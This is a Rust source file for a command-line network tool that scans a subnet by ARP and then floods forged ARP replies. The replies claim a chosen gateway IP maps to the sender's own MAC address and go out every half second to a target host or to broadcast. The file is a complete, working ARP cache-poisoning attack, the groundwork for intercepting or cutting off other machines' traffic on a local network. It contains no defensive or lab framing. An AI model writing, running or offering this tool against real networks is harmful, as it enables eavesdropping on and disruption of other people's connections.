use clap::Parser;
use ipnet::Ipv4Net;
use libarp::client::ArpClient;
use pnet::packet::MutablePacket;
use pnet::packet::Packet;
use pnet::{
    datalink::{channel, interfaces, Channel, Config, NetworkInterface},
    packet::{
        arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket},
        ethernet::{EtherTypes, MutableEthernetPacket},
    },
    util::MacAddr,
};

use std::process::exit;
use std::time::Duration;
use std::{net::Ipv4Addr, str::FromStr};

fn get_default_interface() -> Option<NetworkInterface> {
    let all_interfaces = interfaces();

    // Search for the default interface - the one that is
    // up, not loopback and has an IP.
    all_interfaces
        .iter()
        .find(|e| e.is_up() && !e.is_loopback() && !e.ips.is_empty())
        .cloned()
}

fn get_interface(name: &str) -> Option<NetworkInterface> {
    let all_interfaces = interfaces();

    // Search for the default interface - the one that is
    // up, not loopback and has an IP.
    all_interfaces.iter().find(|e| e.name == name).cloned()
}

fn list_interfaces() {
    let all_interfaces = interfaces();
    all_interfaces.iter().for_each(|e| println!("{}", e.name));
}

fn scan_network(interface: &NetworkInterface, network: &str) {
    let net: Ipv4Net = network.parse().unwrap();
    let mut client = ArpClient::new_with_iface_name(&interface.name).expect("Failed to create ARP client.");
    for ip in net.hosts().collect::<Vec<Ipv4Addr>>() {
        let mac = client.ip_to_mac(ip, Some(Duration::from_millis(200)));
        if let Ok(mac) = mac {
            println!("{} -> {}", ip, mac);
        }
    }

}

#[derive(Parser, Debug)]
#[command(version, about)]
struct Args {
    #[arg(short, long)]
    interface: Option<String>,

    #[arg(short, long)]
    target: Option<String>,

    #[arg(short, long)]
    list: bool,

    #[arg(long)]
    get_default_interface: bool,

    #[arg(long)]
    scan: Option<String>,

    host: Option<String>,
}



fn main() {
    let args = Args::parse();
    if args.list {
        list_interfaces();
        exit(0);
    }

    if args.get_default_interface {
        let interface = get_default_interface().expect("No default interface found.");
        println!("{}", interface.name);
        exit(0);
    }



    let interface = match args.interface {
        Some(u) => get_interface(&u),
        None => get_default_interface(),
    }
    .expect("No proper interface found.");

    if let Some(scan) = args.scan {
        scan_network(&interface, &scan);
        exit(0);
    }


    let target_ip;

    let mut client = ArpClient::new_with_iface_name(&interface.name).expect("Failed to create ARP client.");
    let dest = match args.target {
        Some(ref u) => match MacAddr::from_str(&u) {
            Ok(mac) => {
                target_ip = client
                    .mac_to_ip(mac.into(), Some(std::time::Duration::from_secs(5)))
                    .expect("Get target ip by mac failed.");
                mac
            }
            Err(_) => {
                target_ip = Ipv4Addr::from_str(u).expect("Target is not Mac or IP.");
                let result = client.ip_to_mac(target_ip, None);
                result.expect("Get target mac by ip failed.").into()
            }
        },
        None => {
            target_ip = Ipv4Addr::BROADCAST;
            MacAddr::broadcast()
        },
    };
    let gateway = Ipv4Addr::from_str(&args.host.expect("Fake gateway ip needed."))
        .expect("Invalid fake gateway IP address");
    let my_mac = interface
        .mac
        .expect("No MAC address found for the interface");

    println!("Targe: {:#?}", dest);
    println!("Interface: {}", interface.name);
    let (mut sender, _receiver) = match channel(&interface, Config::default()) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Unknown channel type"),
        Err(e) => panic!("Error happened {}", e),
    };

    let mut ethernet_buffer = [0u8; 42];
    let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).expect("Failed to create ethernet packet.");;

    ethernet_packet.set_destination(MacAddr::broadcast());
    ethernet_packet.set_source(interface.mac.expect("No MAC address found for the interface"));
    ethernet_packet.set_ethertype(EtherTypes::Arp);

    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).expect("Failed to create ARP packet.");

    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperations::Reply);
    arp_packet.set_sender_hw_addr(my_mac);
    arp_packet.set_sender_proto_addr(gateway);
    arp_packet.set_target_hw_addr(dest);
    arp_packet.set_target_proto_addr(target_ip);

    ethernet_packet.set_payload(arp_packet.packet_mut());

    loop {
        sender
            .send_to(ethernet_packet.packet(), None)
            .expect("Failed to send packet.").unwrap();
        println!("{:#?}", arp_packet);
        std::thread::sleep(std::time::Duration::from_millis(500));
    }
}
